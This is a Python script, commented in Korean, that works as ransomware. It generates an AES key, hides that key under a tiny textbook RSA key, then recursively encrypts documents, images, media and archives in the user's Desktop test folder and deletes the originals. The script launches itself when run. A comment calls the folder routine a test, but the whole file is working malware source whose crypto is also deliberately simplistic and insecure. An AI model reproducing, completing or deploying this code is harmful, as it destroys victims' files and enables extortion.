import glob
import os, random, struct
from Cryptodome.Cipher import AES
import secrets
import getpass


class AES128():

    def MakeKey(self):  # AES Key를 만드는 함수
        key = secrets.token_hex(8)  # 8개의 16진수로 키를 만든다.
        fout = open('110011000100011101111000001.txt', 'wt')    # 쓰기 모드로 파일 오픈
        fout.write(key)    # 파일에 키를 쓴다
        fout.close()    # 파일을 닫는다


    def GetKey(self):   # 저장된 AES Key를 얻어오는 함수
        fin = open('110011000100011101111000001.txt', 'rt')    # 읽기 모드로 파일 오픈
        key_str = fin.read()    # key_str에 파일 내용 저장
        Key = bytes(key_str, 'utf-8')   # Key 변수에 파일 내용을 Bytes형으로 변환하여 대입
        return Key  # Key 값을 리턴


    def encrypt_file(self, in_filename, key, out_filename=None, chunksize=64*1024):  # 파일 암호화 함수
        if not out_filename:
            out_filename = in_filename + '.enc' # out_filename 인자를 지정안할 경우 기존 파일명을 사용하여 .enc라는 확장명 추가

        iv = os.urandom(16) # 랜덤한 16자리의 Byte값을 생성
        encryptor = AES.new(key, AES.MODE_CBC, iv) # cryptodomex 모듈의 AES를 이용해서 암호화 키를 생성
        filesize = os.path.getsize(in_filename) # 현재 파일의 파일크기 추출

        with open(in_filename, 'rb') as infile: # 현재파일을 바이너리 모드로 읽음
            with open(out_filename, 'wb') as outfile: # 바이너리 모드로 새로운 파일을 생성
                outfile.write(struct.pack('<Q', filesize)) # 파일크기를 바이너리로 int형으로 패킹하여 새 파일에 작성
                outfile.write(iv) # 새 파일에 랜덤한 16자리의 Byte를 작성

                while True:
                    chunk = infile.read(chunksize) # 현재파일의 (64 * 1024 = 65536) 만큼을 읽어들여 쓰레기값 이라고 선언
                    if len(chunk) == 0: # 현재파일 쓰레기 값의 길이가 0일때 루프 탈출
                        break
                    elif len(chunk) % 16 != 0: # 현재 파일의 쓰레기 값이 16으로 나눴을때 나머지가 0이 아닐 경우 
                        chunk += b' ' * (16 - len(chunk) % 16) # 쓰레기값 += 빈 바이너리 (16 - 현재쓰레기길이 % 16)
                    
                    outfile.write(encryptor.encrypt(chunk)) # AES로 암호화 한 쓰레기를 새 파일에 작성하고 종료

    # 테스트용 암호화 함수
    def Encryption(self, key):
        PathList = []    # Path를 저장할 리스트
        username = getpass.getuser()    # 컴퓨터 유저 이름을 username에 저장
        path = os.path.join(r"C:\Users", username, "Desktop\test\\**")   # C드라이브 경로를 path에 저장
        PathList.append(path)   # C드라이브 경로를 PathList에 추가
        extension = ['.xlsx', '.docx', '.pdf', '.hwp', '.pptx', '.jpg', '.png', '.avi', '.mp4', '.mp3', '.wmv', '.rar', '.zip', '.7z']
        
        for Path in PathList:
            for filename in glob.iglob(Path, recursive=True): # 대상 경로를 재귀적 호출 사용
                if(os.path.isfile(filename)): # 현재 파일이 파일일때
                    for i in range(len(extension)):
                        if (extension[i] in filename):
                            print('Encrypting> ' + filename) # 파일명 출력 (디버깅 용)
                            self.encrypt_file(filename, key) # Encrypt_file에 위에서 선언한 키값과 파일명을 인자로 호출
                            os.remove(filename) # 현재파일을 제거 (encrypt_file 함수에서 새파일을 작성하였기에 기존파일을 제거해야함.)


class RSA():
    def Encrypt(self, data):    # 암호화 연산 함수
            n = 1052651  # 공개키1 (p x q)
            e = 7   # 공개키2 (ϕ(n)와 서로소인 e)
            result = (data ** e) % n    # 암호화 연산
            result = str(result) + ' '  # str로 형변환 후 구분을 위해 맨끝에 공백 추가
            result = bytes(result, 'utf-8')    # bytes로 형변환
            return result   # 암호화 결과 반환


    def Encryption(self, out_filename=None):    # 암호화 함수
        in_filename = '110011000100011101111000001.txt' # AES Key가 저장된 파일 이름 대입
        if not out_filename:
            out_filename = in_filename + '.enc' # out_filename 인자를 지정안할 경우 기존 파일명을 사용하여 .enc라는 확장명 추가

        with open(in_filename, 'rb') as infile:    # AES Key 파일을 바이러리 읽기 모드로 오픈
            with open(out_filename, 'wb') as outfile:   # 암호화 결과를 쓸 파일을 바이너리 쓰기 모드로 오픈
                data = infile.read()    # AES Key 파일 내용을 읽어서 data에 저장 
                data_list = list(data)  # data를 리스트로 변환
                for i in range(len(data_list)):
                    result = self.Encrypt(data_list[i])    # data 암호화 결과를 result에 대입
                    outfile.write(result)   # 암호화된 데이터를 파일에 씀

                infile.close()  # AES Key 파일 닫기
                os.remove(in_filename)  # 원본 파일 제거


# 최종 암호화 함수
def Encryption():
    aes = AES128()
    aes.MakeKey()   # AES Key 생성
    AES_Key = aes.GetKey()  # AES Key를 얻어옴
    rsa = RSA()
    rsa.Encryption()    # AES Key 파일 암호화
    aes.Encryption(AES_Key)    # 컴퓨터 파일 AES로 암호화


Encryption()
